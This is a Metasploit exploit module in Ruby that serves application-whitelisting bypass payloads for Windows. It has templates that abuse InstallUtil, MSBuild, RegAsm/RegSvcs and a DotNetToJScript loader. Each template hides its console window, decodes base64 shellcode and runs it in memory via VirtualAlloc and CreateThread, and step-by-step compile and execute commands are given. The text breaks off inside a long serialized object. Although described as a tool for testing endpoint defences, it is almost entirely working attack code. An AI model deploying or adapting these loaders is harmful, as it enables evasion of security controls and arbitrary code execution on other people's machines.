##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = NormalRanking

  include Msf::Exploit::Remote::HttpServer

  def initialize(info = {})
    super(update_info(info,
      'Name'         => 'Whitelist_Bypass_Server',
      'Description'  => %q(
        This module will create a web server that can host various files to test the effectiveness of an endpoints application
        whitelisting (e.g software restriction policies, AppLocker). To use this module visit the the web server from the endpoint
        to be tested and follow the instructions on the hosted web page.
      ),
      'License'      => MSF_LICENSE,
      'Author'       =>
        [
          'Nick Tyrer <@NickTyrer>',
          'James Forshaw', # For DotNetToJScript (@tiraniddo)
          'Casey Smith',  # AppLocker bypass research and vulnerability discovery (@subTee)
          'Kyle Hanslovan',  # Inf bypass research (@KyleHanslovan)
        ],
      'Platform'      => [ 'win' ],
      'Arch'          => [ ARCH_X86, ARCH_X64 ],
      'SessionTypes'  => [ 'meterpreter' ],
      'Targets'       => [ [ 'Windows', {} ] ],
      'DefaultTarget' => 0,
      'DisclosureDate' => 'Jul 25 2017',
      'References'     =>
        [
          ['URL', 'http://subt0x10.blogspot.com/2016/04/bypass-application-whitelisting-script.html'],
          ['URL', 'https://github.com/tyranid/DotNetToJScript']
        ]
    ))
  end


  def on_request_uri(cli, request)
    case request.uri
     when /INSTALL_UTIL/
       send_response(cli, install_util, 'Content-Type' => 'text/plain')
     when /MSBUILD/
       send_response(cli, msbuild, 'Content-Type' => 'text/plain')
     when /REGASM_REGSVCS/
       send_response(cli, regasm_regsvcs, 'Content-Type' => 'text/plain')
     when /VBSCRIPT/
       send_response(cli, vbscript, 'Content-Type' => 'text/plain')
     when /REGSVR/
       send_response(cli, regsvr, 'Content-Type' => 'text/plain')
     when /HTA/
       send_response(cli, hta, 'Content-Type' => 'text/plain')
     when /RUNDLL/
       send_response(cli, rundll, 'Content-Type' => 'text/plain')
     when /COM/
       send_response(cli, com, 'Content-Type' => 'text/plain')
     when /VBA/
       send_response(cli, vba, 'Content-Type' => 'text/plain')
     when /INF/
       send_response(cli, inf, 'Content-Type' => 'text/plain')
     when /WMIC/
       send_response(cli, wmic, 'Content-Type' => 'text/plain')
     else
       serve_default_page(cli)
    end
  end


  def serve_default_page(cli)
    html = %Q|
     <html>
     <form style="text-align:center;" method="link" action="#{get_resource.chomp('/')}/INSTALL_UTIL">
     <input type="submit" value="Go to INSTALL_UTIL Bypass">
     </form>
     <br>
     <br>
     <br>
     <form style="text-align:center;" method="link" action="#{get_resource.chomp('/')}/MSBUILD">
     <input type="submit" value="Go to MSBUILD Bypass">
     </form>
     <br>
     <br>
     <br>
     <form style="text-align:center;" method="link" action="#{get_resource.chomp('/')}/REGASM_REGSVCS">
     <input type="submit" value="Go to REGASM_REGSVCS Bypass">
     </form>
     <br>
     <br>
     <br>
     <form style="text-align:center;" method="link" action="#{get_resource.chomp('/')}/VBSCRIPT">
     <input type="submit" value="Go to VBSCRIPT Bypass">
     </form>
     <br>
     <br>
     <br>
     <form style="text-align:center;" method="link" action="#{get_resource.chomp('/')}/REGSVR">
     <input type="submit" value="Go to REGSVR Bypass">
     </form>
     <br>
     <br>
     <br>
     <form style="text-align:center;" method="link" action="#{get_resource.chomp('/')}/HTA">
     <input type="submit" value="Go to HTA Bypass">
     </form>
     <br>
     <br>
     <br>
     <form style="text-align:center;" method="link" action="#{get_resource.chomp('/')}/RUNDLL">
     <input type="submit" value="Go to RUNDLL Bypass">
     </form>
     <br>
     <br>
     <br>
     <form style="text-align:center;" method="link" action="#{get_resource.chomp('/')}/COM">
     <input type="submit" value="Go to COM Bypass">
     </form>
     <br>
     <br>
     <br>
     <form style="text-align:center;" method="link" action="#{get_resource.chomp('/')}/VBA">
     <input type="submit" value="Go to VBA Bypass">
     </form>
     <br>
     <br>
     <br>
     <form style="text-align:center;" method="link" action="#{get_resource.chomp('/')}/INF">
     <input type="submit" value="Go to INF Bypass">
     </form>
     <br>
     <br>
     <br>
     <form style="text-align:center;" method="link" action="#{get_resource.chomp('/')}/WMIC">
     <input type="submit" value="Go to WMIC Bypass">
     </form>
     </html>
     |
    send_response(cli, html)
  end


  def build_payload
    sc = payload.encoded
    esc = Rex::Text.encode_base64(sc)
  end


  def install_util
    esc = build_payload
    <<-HEREDOC
/*
Copy the entire contents of this page to a file named installutil.txt
x86{
Compile using: C:\\Windows\\Microsoft.Net\\Framework\\v4.0.30319\\csc.exe /out:installutil.exe installutil.txt
Execute using: C:\\Windows\\Microsoft.Net\\Framework\\v4.0.30319\\InstallUtil.exe /logfile= /LogToConsole=false /U installutil.exe
}
x64{
Compile using: C:\\Windows\\Microsoft.Net\\Framework64\\v4.0.30319\\csc.exe /out:installutil.exe installutil.txt
Execute using: C:\\Windows\\Microsoft.Net\\Framework64\\v4.0.30319\\InstallUtil.exe /logfile= /LogToConsole=false /U installutil.exe
}
*/


using System;

namespace Install_Util
{
  public class Program { public static void Main() { } }

  [System.ComponentModel.RunInstaller(true)]
  public class Pop : System.Configuration.Install.Installer
  {
    private static Int32 MEM_COMMIT=0x1000;
    private static IntPtr PAGE_EXECUTE_READWRITE=(IntPtr)0x40;
    private static UInt32 INFINITE = 0xFFFFFFFF;

    [System.Runtime.InteropServices.DllImport("kernel32")]
    private static extern IntPtr VirtualAlloc(IntPtr a, UIntPtr s, Int32 t, IntPtr p);

    [System.Runtime.InteropServices.DllImport("kernel32")]
    private static extern IntPtr CreateThread(IntPtr att, UIntPtr st, IntPtr sa, IntPtr p, Int32 c, ref IntPtr id);

    [System.Runtime.InteropServices.DllImport("kernel32")]
    private static extern UInt32 WaitForSingleObject(IntPtr h, UInt32 ms);

    [System.Runtime.InteropServices.DllImport("user32.dll")]
    static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

    [System.Runtime.InteropServices.DllImport("Kernel32")]
    private static extern IntPtr GetConsoleWindow();

    const int SW_HIDE = 0;
    const int SW_SHOW = 5;

    public override void Uninstall(System.Collections.IDictionary s)
    {
      IntPtr hwnd;
      hwnd = GetConsoleWindow();
      ShowWindow(hwnd, SW_HIDE);
      string enc = "#{esc}";
      byte[] newBytes = Convert.FromBase64String(enc);
      byte[] sc = newBytes;

      IntPtr m = VirtualAlloc(IntPtr.Zero, (UIntPtr)sc.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
      System.Runtime.InteropServices.Marshal.Copy(sc, 0, m, sc.Length);
      IntPtr id = IntPtr.Zero;
      WaitForSingleObject(CreateThread(id, UIntPtr.Zero, m, id, 0, ref id), INFINITE);
    }
  }
}
    HEREDOC
  end


  def msbuild
    esc = build_payload
    <<-HEREDOC
<!--
Copy the entire contents of this page to a file named msbuild.txt
x86{
Execute using: C:\\Windows\\Microsoft.Net\\Framework\\v4.0.30319\\MSBuild.exe msbuild.txt
}
x64{
Execute using: C:\\Windows\\Microsoft.Net\\Framework64\\v4.0.30319\\MSBuild.exe msbuild.txt
}
-->


<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
<Target Name="metamsbuild">
<Meta />
</Target>
<UsingTask
  TaskName="meta"
  TaskFactory="CodeTaskFactory"
  AssemblyFile="C:\\Windows\\Microsoft.Net\\Framework\\v4.0.30319\\Microsoft.Build.Tasks.v4.0.dll" >
 <Task>
 <Code Type="Class" Language="cs">
 <![CDATA[
         using System;
         using System.Runtime.InteropServices;
         using Microsoft.Build.Framework;
         using Microsoft.Build.Utilities;
         public class meta :  Task, ITask
         {
           private static Int32 MEM_COMMIT=0x1000;
           private static IntPtr PAGE_EXECUTE_READWRITE=(IntPtr)0x40;
           private static UInt32 INFINITE = 0xFFFFFFFF;

           [DllImport("kernel32")]
           private static extern IntPtr VirtualAlloc(IntPtr a, UIntPtr s, Int32 t, IntPtr p);

           [DllImport("kernel32")]
           private static extern IntPtr CreateThread(IntPtr att, UIntPtr st, IntPtr sa, IntPtr p, Int32 c, ref IntPtr id);

           [DllImport("kernel32")]
           private static extern UInt32 WaitForSingleObject(IntPtr h, UInt32 ms);

           [DllImport("user32.dll")]
           static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

           [DllImport("Kernel32")]
           private static extern IntPtr GetConsoleWindow();

           const int SW_HIDE = 0;
           const int SW_SHOW = 5;

         public override bool Execute()
         {
           IntPtr hwnd;
           hwnd = GetConsoleWindow();
           ShowWindow(hwnd, SW_HIDE);
           string enc = "#{esc}";
           byte[] newBytes = Convert.FromBase64String(enc);
           byte[] sc = newBytes;

           IntPtr m = VirtualAlloc(IntPtr.Zero, (UIntPtr)sc.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
           Marshal.Copy(sc, 0, m, sc.Length);
           IntPtr id = IntPtr.Zero;
           WaitForSingleObject(CreateThread(id, UIntPtr.Zero, m, id, 0, ref id), INFINITE);
           return true;
         }
        }
    ]]>
</Code>
</Task>
</UsingTask>
</Project>
    HEREDOC
  end


  def regasm_regsvcs
    esc = build_payload
    <<-HEREDOC
/*
Copy the entire contents of this page to a file named regasm_regsvcs.txt
Copy below base64 string into a text file named meta.txt
BwIAAAAkAABSU0EyAAQAAAEAAQD9yIxqf9oJgwLw6nUHqVNq4LaP+/eaL4qTT9K9aV/z7ddCP8+Uf2/47KnHklpaw+eH03ZaA2yKYBA9s+Al0VoyajA76HQpHDaCgiURBIT2GBLUGwdhoEMWX5J8eoCzkucJEjSsavQh+r9JeB6zcQvoZIx0PrpELgQc8is8j2jvsFuc5LQ8ZFoPk1273TTxKibw84HFESjxJrRtkSjwoEo4OUuZtL3C7fDgnaSoeLnMwohmyTTjt15zgBZv7xD5u/CHD4/+tySJufY5j0FkBxhyqt2DWHcmH4MQCC6PgYfIuTXEAD35o0cg+6s6pJYKB+DUCrU5vSime3jyWno9vCe87UT+fQcDrKntHBmjnj9WliAMZlU1IuCWieT7fzGZqqIsd4rrcgxetnWzaWRAkgHcTVkmVPIt0z9zHU71s7CER2viklJkiaZjRQan5ZA7bTqqsuG1xoIyXTWbKsaAMCKf5a4IJS2ImpqaYA9HRBrIV7be2o0QJxSm1LPqBXJqkAhnCpcYyfve2dql7fF+fAIDGe3ZgCEbJsfYuAaAY0snGJQhUgLmwO8GDbsbMUTuBQspDv8QXsF53UNH5v5dnOKaTfo71LrI+I5zBUqEYP3BDtK0qryu/J1eq80nPAmpNqRbFnYm1OdGKpgzHS+Ws7obPSt1HG3//BxC3a5znX0evfCfSaaWRswhjvblnh1070b3jkT6nJeksKuuVEHvudAQAtGn2vxNDs4CqrJODi5Z/BAKgpIZqQeZmh3r4Zb5OI0=
Execute: certutil.exe -decode meta.txt meta.snk
x86{
Compile using: C:\\Windows\\Microsoft.Net\\Framework\\v4.0.30319\\csc.exe /r:System.EnterpriseServices.dll /target:library /out:regasm_regsvcs.dll /keyfile:meta.snk regasm_regsvcs.txt
Execute using: C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\regsvcs.exe regasm_regsvcs.dll
or
Execute using: C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\regasm.exe /U regasm_regsvcs.dll
}
x64{
Compile using: C:\\Windows\\Microsoft.Net\\Framework64\\v4.0.30319\\csc.exe /r:System.EnterpriseServices.dll /target:library /out:regasm_regsvcs.dll /keyfile:meta.snk regasm_regsvcs.txt
Execute using: C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\regsvcs.exe regasm_regsvcs.dll
or
Execute using: C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\regasm.exe /U regasm_regsvcs.dll
}
*/


using System;
using System.EnterpriseServices;
using System.Runtime.InteropServices;

namespace regsvcs
{
  public class Bypass : ServicedComponent
  {
    public Bypass() { Console.WriteLine("Hello"); }

    [ComRegisterFunction]
    public static void RegisterClass(string key)
    {
      sc.exec();
    }

    [ComUnregisterFunction]
    public static void UnRegisterClass(string key)
    {
      sc.exec();
    }
  }

  public class sc
  {
    private static Int32 MEM_COMMIT = 0x1000;
    private static IntPtr PAGE_EXECUTE_READWRITE = (IntPtr)0x40;
    private static UInt32 INFINITE = 0xFFFFFFFF;

    [DllImport("kernel32")]
    private static extern IntPtr VirtualAlloc(IntPtr a, UIntPtr s, Int32 t, IntPtr p);

    [DllImport("kernel32")]
    private static extern IntPtr CreateThread(IntPtr att, UIntPtr st, IntPtr sa, IntPtr p, Int32 c, ref IntPtr id);

    [DllImport("kernel32")]
    private static extern UInt32 WaitForSingleObject(IntPtr h, UInt32 ms);

    [DllImport("user32.dll")]
    static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

    [DllImport("Kernel32")]
    private static extern IntPtr GetConsoleWindow();

    const int SW_HIDE = 0;
    const int SW_SHOW = 5;

    public static void exec()
    {
      IntPtr hwnd;
      hwnd = GetConsoleWindow();
      ShowWindow(hwnd, SW_HIDE);
      string enc = "#{esc}";
      byte[] newBytes = Convert.FromBase64String(enc);
      byte[] sc = newBytes;

      IntPtr m = VirtualAlloc(IntPtr.Zero, (UIntPtr)sc.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
      Marshal.Copy(sc, 0, m, sc.Length);
      IntPtr id = IntPtr.Zero;
      WaitForSingleObject(CreateThread(id, UIntPtr.Zero, m, id, 0, ref id), INFINITE);
    }
  }
}
    HEREDOC
  end


  def jscript
    esc = build_payload
    <<-HEREDOC
var enc = "#{esc}"

function setversion() {
var shell = new ActiveXObject('WScript.Shell');
ver = 'v4.0.30319';
try {
shell.RegRead('HKLM\\\\SOFTWARE\\\\Microsoft\\\\.NETFramework\\\\v4.0.30319\\\\');
} catch(e) {
ver = 'v2.0.50727';
}
shell.Environment('Process')('COMPLUS_Version') = ver;

}
function debug(s) {}
function base64ToStream(b) {
        var enc = new ActiveXObject("System.Text.ASCIIEncoding");
        var length = enc.GetByteCount_2(b);
        var ba = enc.GetBytes_4(b);
        var transform = new ActiveXObject("System.Security.Cryptography.FromBase64Transform");
        ba = transform.TransformFinalBlock(ba, 0, length);
        var ms = new ActiveXObject("System.IO.MemoryStream");
        ms.Write(ba, 0, (length / 4) * 3);
        ms.Position = 0;
        return ms;
}

var serialized_obj = "AAEAAAD/////AQAAAAAAAAAEAQAAACJTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVy"+
"AwAAAAhEZWxlZ2F0ZQd0YXJnZXQwB21ldGhvZDADAwMwU3lzdGVtLkRlbGVnYXRlU2VyaWFsaXph"+
"dGlvbkhvbGRlcitEZWxlZ2F0ZUVudHJ5IlN5c3RlbS5EZWxlZ2F0ZVNlcmlhbGl6YXRpb25Ib2xk"+
"ZXIvU3lzdGVtLlJlZmxlY3Rpb24uTWVtYmVySW5mb1NlcmlhbGl6YXRpb25Ib2xkZXIJAgAAAAkD"+
"AAAACQQAAAAEAgAAADBTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVyK0RlbGVnYXRl"+
"RW50cnkHAAAABHR5cGUIYXNzZW1ibHkGdGFyZ2V0EnRhcmdldFR5cGVBc3NlbWJseQ50YXJnZXRU"+
"eXBlTmFtZQptZXRob2ROYW1lDWRlbGVnYXRlRW50cnkBAQIBAQEDMFN5c3RlbS5EZWxlZ2F0ZVNl"+
"cmlhbGl6YXRpb25Ib2xkZXIrRGVsZWdhdGVFbnRyeQYFAAAAL1N5c3RlbS5SdW50aW1lLlJlbW90"+
"aW5nLk1lc3NhZ2luZy5IZWFkZXJIYW5kbGVyBgYAAABLbXNjb3JsaWIsIFZlcnNpb249Mi4wLjAu"+
"MCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5BgcAAAAH"+
"dGFyZ2V0MAkGAAAABgkAAAAPU3lzdGVtLkRlbGVnYXRlBgoAAAANRHluYW1pY0ludm9rZQoEAwAA"+
"ACJTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVyAwAAAAhEZWxlZ2F0ZQd0YXJnZXQw"+
"B21ldGhvZDADBwMwU3lzdGVtLkRlbGVnYXRlU2VyaWFsaXphdGlvbkhvbGRlcitEZWxlZ2F0ZUVu"+
"dHJ5Ai9TeXN0ZW0uUmVmbGVjdGlvbi5NZW1iZXJJbmZvU2VyaWFsaXphdGlvbkhvbGRlcgkLAAAA"+
"CQwAAAAJDQAAAAQEAAAAL1N5c3RlbS5SZWZsZWN0aW9uLk1lbWJlckluZm9TZXJpYWxpemF0aW9u"+
"SG9sZGVyBgAAAAROYW1lDEFzc2VtYmx5TmFtZQlDbGFzc05hbWUJU2lnbmF0dXJlCk1lbWJlclR5"+
"cGUQR2VuZXJpY0FyZ3VtZW50cwEBAQEAAwgNU3lzdGVtLlR5cGVbXQkKAAAACQYAAAAJCQAAAAYR"+
"AAAALFN5c3RlbS5PYmplY3QgRHluYW1pY0ludm9rZShTeXN0ZW0uT2JqZWN0W10pCAAAAAoBCwAA"+
"AAIAAAAGEgAAACBTeXN0ZW0uWG1sLlNjaGVtYS5YbWxWYWx1ZUdldHRlcgYTAAAATVN5c3RlbS5Y"+
"bWwsIFZlcnNpb249Mi4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdh"+
"NWM1NjE5MzRlMDg5BhQAAAAHdGFyZ2V0MAkGAAAABhYAAAAaU3lzdGVtLlJlZmxlY3Rpb24uQXNz"+
"ZW1ibHkGFwAAAARMb2FkCg8MAAAAABQAAAJNWpAAAwAAAAQAAAD//wAAuAAAAAAAAABAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACAAAAADh+6DgC0Cc0huAFMzSFUaGlzIHByb2dy"+
"YW0gY2Fubm90IGJlIHJ1biBpbiBET1MgbW9kZS4NDQokAAAAAAAAAFBFAABMAQMAiZVjWgAAAAAA"+
"AAAA4AAiIAsBMAAADAAAAAYAAAAAAAAeKgAAACAAAABAAAAAAAAQACAAAAACAAAEAAAAAAAAAAQA"+
"AAAAAAAAAIAAAAACAAAAAAAAAwBAhQAAEAAAEAAAAAAQAAAQAAAAAAAAEAAAAAAAAAAAAAAAzCkA"+
"AE8AAAAAQAAAWAMAAAAAAAAAAAAAAAAAAAAAAAAAYAAADAAAAJQoAAAcAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAgAAAIAAAAAAAAAAAAAAAIIAAASAAAAAAAAAAA"+
"AAAALnRleHQAAAAkCgAAACAAAAAMAAAAAgAAAAAAAAAAAAAAAAAAIAAAYC5yc3JjAAAAWAMAAABA"+
"AAAABAAAAA4AAAAAAAAAAAAAAAAAAEAAAEAucmVsb2MAAAwAAAAAYAAAAAIAAAASAAAAAAAAAAAA"+
"AAAAAABAAABCAAAAAAAAAAAAAAAAAAAAAAAqAAAAAAAASAAAAAIABQDwIAAApAcAAAEAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAEzAGAGwAAAAB"+
"AAARACgFAAAGCgYWKAQAAAYmAwsHKA4AAAoMCA1+DwAACgmOaWooEAAACn4BAAAEfgIAAAQoAQAA"+
"BhMECRYRBAmOaSgRAAAKAH4PAAAKEwURBX4SAAAKEQQRBRYSBSgCAAAGfgMAAAQoAwAABiYqIgIo"+
"EwAACgAqdiAAEAAAgAEAAAQfQCgUAAAKgAIAAAQVgAMAAAQqAEJTSkIBAAEAAAAAAAwAAAB2Mi4w"+
"LjUwNzI3AAAAAAUAbAAAAAQDAAAjfgAAcAMAAAQDAAAjU3RyaW5ncwAAAAB0BgAABAAAACNVUwB4"+
"BgAAEAAAACNHVUlEAAAAiAYAABwBAAAjQmxvYgAAAAAAAAACAAABVx0CFAkAAAAA+gEzABYAAAEA"+
"AAATAAAAAgAAAAUAAAAIAAAADwAAABQAAAACAAAADgAAAAEAAAADAAAABQAAAAEAAAABAAAAAAAB"+
"AgEAAAAAAAYAUAF3AgYAvQF3AgYAnQBFAg8AlwIAAAYAxQAXAgYAMwEXAgYAFAEXAgYApAEXAgYA"+
"cAEXAgYAiQEXAgYA3AAXAgYAsQBYAgYAjwBYAgYA9wAXAgYAtgIKAgYAyQIKAgYAPgIKAgYAPQIK"+
"AgYA7gFYAgAAAAATAAAAAAABAAEAAQAQAFoAAAA9AAEAAQARAEQAVwARAC0AKwARACQAWgBRgBwA"+
"VwBRgE8AVwAAAAAAgACRIGgAXQABAAAAAACAAJEgdQBlAAUAAAAAAIAAkSCpAnAACwAAAAAAgACR"+
"IOkCdgANAAAAAACAAJEg2AJ8AA8AUCAAAAAAhgARAhAADwDIIAAAAACGGDACBgAQANEgAAAAAJEY"+
"NgKAABAAAAABAF0AAAACAKcCAAADANYCAAAEAC4CAAABANQCAAACANECAAADAFcAAAAEAC4CAAAF"+
"AHMAAAAGAIIAAAABAOwBAAACAKYCAAABAIUAAAACAPQCAAABAIoACQAwAgEAEQAwAgYAGQAwAgoA"+
"KQAwAhAAMQAwAhAAOQAwAhAAQQAwAhAASQAwAhAAUQAwAhAAWQAwAhAAYQAwAhUAaQAwAhAAcQAw"+
"AhAAgQDbASUAiQApAisAkQC9Ai4AmQD9AjMAkQApAjwAeQAwAgYAiQC9Aj8ACAAQAE0ACAAUAFIA"+
"LgALAIQALgATAI0ALgAbAKwALgAjALUALgArAL8ALgAzAL8ALgA7AL8ALgBDALUALgBLAMUALgBT"+
"AL8ALgBbAL8ALgBjAN0ALgBrAAcBQwBbABQBGgAKAPYBAQAAAQMAaAABAAABBQB1AAEAAAEHAKkC"+
"AQAAAQkA6QICAAABCwDYAgMABIAAAAEAAAAAAAAAAAAAAAAAWgAAAAIAAAAAAAAAAAAAAEQAXwAA"+
"AAAAAAAAS2VybmVsMzIAa2VybmVsMzIAPE1vZHVsZT4AU1dfSElERQBJTkZJTklURQBQQUdFX0VY"+
"RUNVVEVfUkVBRFdSSVRFAE1FTV9DT01NSVQAU1dfU0hPVwBzYQBtZXRhAG1zY29ybGliAFZpcnR1"+
"YWxBbGxvYwBDcmVhdGVUaHJlYWQAaWQAaFduZABjb2RlAEd1aWRBdHRyaWJ1dGUARGVidWdnYWJs"+
"ZUF0dHJpYnV0ZQBDb21WaXNpYmxlQXR0cmlidXRlAEFzc2VtYmx5VGl0bGVBdHRyaWJ1dGUAQXNz"+
"ZW1ibHlUcmFkZW1hcmtBdHRyaWJ1dGUAQXNzZW1ibHlGaWxlVmVyc2lvbkF0dHJpYnV0ZQBBc3Nl"+
"bWJseUNvbmZpZ3VyYXRpb25BdHRyaWJ1dGUAQXNzZW1ibHlEZXNjcmlwdGlvbkF0dHJpYnV0ZQBD"+
"b21waWxhdGlvblJlbGF4YXRpb25zQXR0cmlidXRlAEFzc2VtYmx5UHJvZHVjdEF0dHJpYnV0ZQBB"+
"c3NlbWJseUNvcHlyaWdodEF0dHJpYnV0ZQBBc3NlbWJseUNvbXBhbnlBdHRyaWJ1dGUAUnVudGlt"+
"ZUNvbXBhdGliaWxpdHlBdHRyaWJ1dGUARnJvbUJhc2U2NFN0cmluZwBoAE1hcnNoYWwAdXNlcjMy"+
"LmRsbABtZXRhLmRsbABTeXN0ZW0Ac2NfaW4AU3lzdGVtLlJlZmxlY3Rpb24AWmVybwBwAC5jdG9y"+
"AC5jY3RvcgBVSW50UHRyAFN5c3RlbS5EaWFnbm9zdGljcwBTeXN0ZW0uUnVudGltZS5JbnRlcm9w"+
"U2VydmljZXMAU3lzdGVtLlJ1bnRpbWUuQ29tcGlsZXJTZXJ2aWNlcwBEZWJ1Z2dpbmdNb2RlcwBt"+
"cwBXYWl0Rm9yU2luZ2xlT2JqZWN0AG9wX0V4cGxpY2l0AENvbnZlcnQAc3QAYXR0AEdldENvbnNv"+
"bGVXaW5kb3cAU2hvd1dpbmRvdwBuQ21kU2hvdwBDb3B5AAAAAAAAAMFKLNHGIn1OtOxKclz5L1cA"+
"BCABAQgDIAABBSABARERBCABAQ4EIAEBAgoHBhgOHQUdBRgYBQABHQUOAgYYBAABGQsIAAQBHQUI"+
"GAgCBhkEAAEYCAi3elxWGTTgiQQAAAAABAUAAAACBggCBgkHAAQYGBkIGAoABhgYGRgYCBAYBQAC"+
"CRgJBQACAhgIAwAAGAMAAAEIAQAIAAAAAAAeAQABAFQCFldyYXBOb25FeGNlcHRpb25UaHJvd3MB"+
"CAEABwEAAAAACQEABG1ldGEAAAUBAAAAABcBABJDb3B5cmlnaHQgwqkgIDIwMTgAACkBACQ4NjY0"+
"NzhhNi1jMWQyLTRlZWUtODU0ZS1kMzRkYWRjZjYwNjkAAAwBAAcxLjAuMC4wAAAFAQABAAAAAAAA"+
"AACIlWNaAAAAAAIAAAAcAQAAsCgAALAKAABSU0RTooN9OKxGU0660BHQ1HwMZwEAAABDOlxVc2Vy"+
"c1xOaWNrXHNvdXJjZVxyZXBvc1xtZXRhXG1ldGFcb2JqXERlYnVnXG1ldGEucGRiAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAPQpAAAAAAAAAAAAAA4qAAAAIAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAKgAAAAAAAAAAAAAAAF9Db3JEbGxNYWluAG1zY29yZWUuZGxsAAAAAAD/JQAgABAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAQAQAAAAGAAAgAAAAAAAAAAAAAAAAAAA"+
"AQABAAAAMAAAgAAAAAAAAAAAAAAAAAAAAQAAAAAASAAAAFhAAAD8AgAAAAAAAAAAAAD8AjQAAABW"+
"AFMAXwBWAEUAUgBTAEkATwBOAF8ASQBOAEYATwAAAAAAvQTv/gAAAQAAAAEAAAAAAAAAAQAAAAAA"+
"PwAAAAAAAAAEAAAAAgAAAAAAAAAAAAAAAAAAAEQAAAABAFYAYQByAEYAaQBsAGUASQBuAGYAbwAA"+
"AAAAJAAEAAAAVAByAGEAbgBzAGwAYQB0AGkAbwBuAAAAAAAAALAEXAIAAAEAUwB0AHIAaQBuAGcA"+
"RgBpAGwAZQBJAG4AZgBvAAAAOAIAAAEAMAAwADAAMAAwADQAYgAwAAAAGgABAAEAQwBvAG0AbQBl"+
"AG4AdABzAAAAAAAAACIAAQABAEMAbwBtAHAAYQBuAHkATgBhAG0AZQAAAAAAAAAAADIABQABAEYA"+
"aQBsAGUARABlAHMAYwByAGkAcAB0AGkAbwBuAAAAAABtAGUAdABhAAAAAAAwAAgAAQBGAGkAbABl"+
"AFYAZQByAHMAaQBvAG4AAAAAADEALgAwAC4AMAAuADAAAAAyAAkAAQBJAG4AdABlAHIAbgBhAGwA"+
"TgBhAG0AZQAAAG0AZQB0AGEALgBkAGwAbAAAAAAASAASAAEATABlAGcAYQBsAEMAbwBwAHkAcgBp"+
"AGcAaAB0AAAAQwBvAHAAeQByAGkAZwBoAHQAIACpACAAIAAyADAAMQA4AAAAKgABAAEATABlAGcA"+
"YQBsAFQAcgBhAGQAZQBtAGEAcgBrAHMAAAAAAAAAAAA6AAkAAQBPAHIAaQBnAGkAbgBhAGwARgBp"+
"AGwAZQBuAGEAbQBlAAAAbQBlAHQAYQAuAGQAbABsAAAAAAAqAAUAAQBQAHIAbwBkAHUAYwB0AE4A"+
"YQBtAGUAAAAAAG0AZQB0AGEAAAAAADQACAABAFAAcgBvAGQAdQBjAHQAVgBlAHIAcwBpAG8AbgAA"+
"ADEALgAwAC4AMAAuADAAAAA4AAgAAQBBAHMAcwBlAG0AYgBsAHkAIABWAGUAcgBzAGkAbwBuAAAA"+
"MQAuADAALgAwAC4AMAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
